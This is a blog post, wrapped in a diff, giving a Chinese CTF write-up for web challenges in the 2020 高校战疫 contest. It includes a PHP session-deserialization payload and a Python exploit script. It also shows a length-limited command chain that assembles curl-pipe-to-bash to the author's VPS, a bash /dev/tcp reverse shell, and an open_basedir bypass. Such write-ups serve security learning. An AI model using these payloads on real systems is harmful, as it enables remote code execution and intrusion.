@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，俺果然是菜鸡 Session反序列">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[高校战“疫”网络安全分享赛] 部分WriteUp">
+<meta property="og:url" content="/2020/03/09/高校战疫联赛部分Writeup/index.html">
+<meta property="og:site_name" content="dkk-blog">
+<meta property="og:description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，俺果然是菜鸡 Session反序列">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="/2020/03/09/高校战疫联赛部分Writeup/1.png">
+<meta property="og:image" content="/2020/03/09/高校战疫联赛部分Writeup/2.png">
+<meta property="og:image" content="/2020/03/09/高校战疫联赛部分Writeup/3.png">
+<meta property="og:updated_time" content="2020-03-09T17:25:22.323Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[高校战“疫”网络安全分享赛] 部分WriteUp">
+<meta name="twitter:description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，俺果然是菜鸡 Session反序列">
+<meta name="twitter:image" content="/2020/03/09/高校战疫联赛部分Writeup/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>[高校战“疫”网络安全分享赛] 部分WriteUp</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/02/17/Web拟态防御题型初探/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=/2020/03/09/高校战疫联赛部分Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=/2020/03/09/高校战疫联赛部分Writeup/&text=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=/2020/03/09/高校战疫联赛部分Writeup/&is_video=false&description=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[高校战“疫”网络安全分享赛] 部分WriteUp&body=Check out this article: /2020/03/09/高校战疫联赛部分Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=/2020/03/09/高校战疫联赛部分Writeup/&name=[高校战“疫”网络安全分享赛] 部分WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">[高校战“疫”网络安全分享赛] 部分WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">Hackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.1.</span> <span class="toc-text">Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass $url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">PHP-UAF</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        [高校战“疫”网络安全分享赛] 部分WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">dkk-blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-09T05:22:39.000Z" itemprop="datePublished">2020-03-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Web/">Web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1><span id="高校战疫网络安全分享赛-部分writeup">[高校战“疫”网络安全分享赛] 部分WriteUp</span></h1><p>[TOC]</p>
+<!-- toc -->
+
+<ul>
+<li><a href="#前言">前言</a></li>
+<li><a href="#hackme">Hackme</a><ul>
+<li><a href="#session反序列化">Session反序列化</a></li>
+<li><a href="#bypass-url">Bypass $url</a></li>
+</ul>
+</li>
+<li><a href="#php-uaf">PHP-UAF</a></li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="前言">前言</span></h2><p>我太菜了，记录一下Web题目</p>
+<h2><span id="hackme">Hackme</span></h2><p><code>http://121.36.222.22:88/?page=index</code><br>看到链接还想会不会是目录穿越任意文件读取什么的还试了试<code>../../../../flag</code>，俺果然是菜鸡</p>
+<h3><span id="session反序列化">Session反序列化</span></h3><p>扫目录<code>www.zip</code>拿到源码<br>审计源码，没有看到执行命令或者输出flag的地方<br>init.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//初始化整个页面</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//lib.php包括一些常见的函数</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>,<span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
+
+<p><code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code>猜测可能是<a href="https://www.freebuf.com/column/199220.html" target="_blank" rel="noopener">Session反序列化</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/82703639" target="_blank" rel="noopener">四个实例递进php反序列化漏洞理解</a><br>需要找到<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>巧了在<code>upload_sign.php</code>找到了，<br>exp.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line">&#125;</span><br><span class="line">$info = <span class="keyword">new</span> info();</span><br><span class="line">$info -&gt; admin = <span class="number">1</span>;</span><br><span class="line">$info -&gt; sign = <span class="string">'1'</span>;</span><br><span class="line">var_dump(serialize($info));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，POST时前面有一个<code>|</code>，后面的数据，在储存时就会加上键名进行序列化，但是进行读取的时候还是会按照php handler来处理，以<code>|</code>作为键和值的分隔符，将前半部分当作键，后半部分当作值,然后进行反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Url:http://121.36.222.22:88/upload_sign.php</span><br><span class="line">Post:sign=|O:4:&quot;info&quot;:2:&#123;s:5:&quot;admin&quot;;i:1;s:4:&quot;sign&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>./core/index.php</code>就发现又出来一堆代码，Web届的套娃</p>
+<h3><span id="bypass-url">Bypass $url</span></h3><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'./init.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (check_session($_SESSION)) &#123;</span><br><span class="line">    <span class="comment">#hint : core/clear.php</span></span><br><span class="line">    $sandbox = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">        $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">        <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, $url)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you are hacker"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $res = parse_url($url);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, $res[<span class="string">'host'</span>])) &#123;</span><br><span class="line">                    $code = file_get_contents($url);</span><br><span class="line">                    <span class="keyword">if</span> (strlen($code) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">                        @exec($code);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"invalid url"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'只有管理员才能看到我哟'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>$url 三重检测</p>
+<ul>
+<li><code>filter_var($url, FILTER_VALIDATE_URL)</code><br><img src="/2020/03/09/高校战疫联赛部分Writeup/1.png" alt></li>
+<li><code>preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)</code><br><img src="/2020/03/09/高校战疫联赛部分Writeup/2.png" alt><br>不能出现<code>data://</code>或者<code>&amp;</code>或者<code>|</code>或者<code>./</code></li>
+<li><code>preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])</code>        //这个也不算检测<br>一时间没想起<code>ByteCTF的boring_code</code>还是太菜了，大师傅的提醒下找了几篇Writeup，找了一下午大部分都是<code>花钱买域名</code>    、<code>利用百度网盘或者百度搜索跳转</code>或者<code>利用百度302跳转</code><br>最后师傅告我有个<code>compress.zlib://data</code><br><img src="/2020/03/09/高校战疫联赛部分Writeup/3.png" alt><br>能执行命令了，但是没有回显，而且每次执行命令长度不能超过4⃣️<br>老题了<code>hitcon-ctf-2017的babyfirst-revenge-v2</code><br>参考文章<a href="https://blog.csdn.net/nzjdsds/article/details/102940762" target="_blank" rel="noopener">不止这一个</a><br>exp.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line">url = <span class="string">'http://121.36.222.22:88/core/'</span></span><br><span class="line">url1 = <span class="string">'http://121.36.222.22:88/upload_sign.php'</span></span><br><span class="line">post1=&#123;</span><br><span class="line">    <span class="string">"sign"</span>:<span class="string">'|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:2:"ls";&#125;'</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">"compress.zlib://data:@127.0.0.1/888?,&#123;&#125;"</span></span><br><span class="line">req.post(url1,data=post1)</span><br><span class="line">text = req.get(url).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="keyword">if</span> len(text)&lt;<span class="number">15</span>:</span><br><span class="line">    print(text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"[+]start attack!!!"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"payload1.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        i=i.rstrip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="comment">#print(payload.format(i))</span></span><br><span class="line">        post_payload=&#123;</span><br><span class="line">            <span class="string">"url"</span>:payload.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        print(post_payload)</span><br><span class="line">        text = req.post(url,data=post_payload).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> len(text)&gt;<span class="number">42</span>:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"[+]"</span>+payload.format(i)+<span class="string">'\n'</span>+text)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>payload1.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">&gt;sh</span><br><span class="line">&gt;ba\</span><br><span class="line">&gt;\%7C\		##上面三重检测的第二个过滤了|,url编码一下就🉑️</span><br><span class="line">&gt;0\</span><br><span class="line">&gt;18\</span><br><span class="line">&gt;5.\</span><br><span class="line">&gt;11\</span><br><span class="line">&gt;8.\</span><br><span class="line">&gt;14\</span><br><span class="line">&gt;7.\</span><br><span class="line">&gt;20\</span><br><span class="line">&gt;\%20\</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh%20x</span><br><span class="line">sh%20g</span><br></pre></td></tr></table></figure>
+
+<p>把<code>payload1.txt</code>中间的IP换成自己vps的，然后放反弹shell<code>bash -i &gt;&amp; /dev/tcp/vpsip/2333 0&gt;&amp;1</code><br>监听端口，<code>cat /flag</code></p>
+<h2><span id="php-uaf">PHP-UAF</span></h2><p>老题了（第一次好像是2019EIS—ezpass），直接上exp了<br>exp.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_ basedir'</span>, <span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'sub'</span>);</span><br><span class="line">chdir(<span class="string">'sub'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"><span class="comment">//https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</span></span><br><span class="line">(下面太长了就不粘贴出来了，二进制👴写的咱也看不懂</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">[高校战“疫”网络安全分享赛] 部分WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">Hackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.1.</span> <span class="toc-text">Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass $url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">PHP-UAF</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=/2020/03/09/高校战疫联赛部分Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=/2020/03/09/高校战疫联赛部分Writeup/&text=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=/2020/03/09/高校战疫联赛部分Writeup/&is_video=false&description=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[高校战“疫”网络安全分享赛] 部分WriteUp&body=Check out this article: /2020/03/09/高校战疫联赛部分Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=/2020/03/09/高校战疫联赛部分Writeup/&title=[高校战“疫”网络安全分享赛] 部分WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=/2020/03/09/高校战疫联赛部分Writeup/&name=[高校战“疫”网络安全分享赛] 部分WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 dkk
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  <br />
+  <img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#fdebe7" target="_blank" text-align="center">苏ICP备19045774号-1</a>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
